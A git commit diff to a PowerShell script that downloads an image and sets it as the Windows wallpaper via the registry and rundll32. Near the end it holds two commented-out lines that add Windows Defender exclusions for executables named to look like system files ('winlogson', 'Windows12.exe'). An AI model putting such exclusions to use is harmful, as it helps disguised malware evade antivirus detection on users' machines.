17f2fefb5c6c93afdad5887ed3c29221f3633fa5
Pietro Bof <87310730+coluich@users.noreply.github.com>
2025-04-24 11:38:31 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -6,9 +6,14 @@ Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath
 while (!(Test-Path $outputPath)) {
     Start-Sleep -Seconds 1
 }
+while (!(Test-Path $outputPath -PathType Leaf) -or (Get-Item $outputPath).length -eq 0) {
+    Start-Sleep -Seconds 1
+}
+
 $RegKeyPath = "HKCU:\Control Panel\Desktop"
 Set-ItemProperty -Path $RegKeyPath -Name Wallpaper -Value $outputPath
 rundll32.exe user32.dll, UpdatePerUserSystemParameters
+RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters 1, True
 
 # Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
 # Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
